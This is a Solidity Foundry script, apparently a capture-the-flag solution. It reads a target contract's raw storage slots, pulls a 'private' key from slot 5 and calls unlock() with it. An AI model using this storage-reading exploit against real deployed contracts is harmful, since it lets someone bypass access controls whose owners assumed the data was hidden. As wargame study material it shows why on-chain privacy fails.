// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

contract Solve is Script, Test {
  address target = address(0x7b6aEfe81A5Cf904F26031D5fD26884F6a3ce92a);
  using stdStorage for StdStorage;

  function run() public {
    vm.startBroadcast();

    for (uint256 i = 0; i <= 6; i++) {
      bytes32 currentSlot = vm.load(target, bytes32(abi.encode(i)));
      console.log("Slot %s", i);
      emit log_named_bytes("Value", abi.encode(currentSlot));
    }

    bytes32 currentSlot = vm.load(target, bytes32(abi.encode(5)));
    bytes16 key = bytes16(currentSlot);

    (bool success, ) = target.call(abi.encodeWithSignature("unlock(bytes16)", key));
    require(success, "Call to unlock() failed");

    vm.stopBroadcast();
  }
}
